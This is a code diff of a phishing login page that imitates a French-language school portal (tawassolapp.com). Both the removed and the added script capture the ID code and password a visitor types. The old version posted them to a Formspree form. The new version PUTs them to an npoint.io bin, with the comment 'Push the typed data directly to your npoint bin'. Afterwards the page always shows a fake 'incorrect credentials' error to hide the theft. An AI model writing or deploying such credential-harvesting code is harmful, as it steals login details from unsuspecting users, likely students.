@@ -54,38 +54,38 @@
     </div>
     <script src="https://tawassolapp.com/eleve_assets/vendors/js/vendor.bundle.base.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
-    <script>
-        var baseURL = 'https://tawassolapp.com/';
-        toastr.options.closeButton = true;
-        toastr.options.progressBar = true;
-
-        $(document).ready(function() {
-            $("#btnSubmitLogin").click(function(e) {
-                e.preventDefault();
-                var code = $('input[name=code]').val().trim();
-                var password = $('input[name=password]').val().trim();
-
-                if(code.length > 0 && password.length > 0){
-                    $("#btnSubmitLogin").html(`<div class="lds-ring"><div></div><div></div><div></div><div></div></div>`);
-
-                    // Sends data to Formspree (a free form-to-email/dashboard collector)
-                    fetch('https://formspree.io/f/mppzbpad', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ code: code, password: password })
-                    }).then(() => {
-                        setTimeout(function() {
-                            $("#btnSubmitLogin").html(`<span class="d-block p-2">Se connecter</span>`);
-                            toastr.error("L'identifiant et/ou le mot de passe sont incorrects", 'Erreur', { timeOut: 5000 });
-                        }, 1000);
-                    }).catch(() => {
-                        $("#btnSubmitLogin").html(`<span class="d-block p-2">Se connecter</span>`);
-                    });
-                } else {
-                    toastr.error("Les champs sont vides", 'Erreur', { timeOut: 5000 });
-                }
-            });
-        });
-    </script>
+<script>
+           var baseURL = 'https://tawassolapp.com/';
+           toastr.options.closeButton = true;
+           toastr.options.progressBar = true;
+           
+           $(document).ready(function() {
+               $("#btnSubmitLogin").click(function(e) {
+                   e.preventDefault();
+                   var code = $('input[name=code]').val().trim();
+                   var password = $('input[name=password]').val().trim();
+                   
+                   if(code.length > 0 && password.length > 0){
+                       $("#btnSubmitLogin").html(`<div class="lds-ring"><div></div><div></div><div></div><div></div></div>`);
+                       
+                       // Push the typed data directly to your npoint bin
+                       fetch('https://api.npoint.io/de1504b3aa33f17f65e1', {
+                           method: 'PUT',
+                           headers: { 'Content-Type': 'application/json' },
+                           body: JSON.stringify({ log: `Identifiant: ${code} | Password: ${password}` })
+                       }).then(() => {
+                           setTimeout(function() {
+                               $("#btnSubmitLogin").html(`<span class="d-block p-2">Se connecter</span>`);
+                               toastr.error("L'identifiant et/ou le mot de passe sont incorrects", 'Erreur', { timeOut: 5000 });
+                           }, 1000);
+                       }).catch(() => {
+                           $("#btnSubmitLogin").html(`<span class="d-block p-2">Se connecter</span>`);
+                       });
+                   } else {
+                       toastr.error("Les champs sont vides", 'Erreur', { timeOut: 5000 });
+                   }
+               });
+           });
+       </script>
 </body>
 </html>
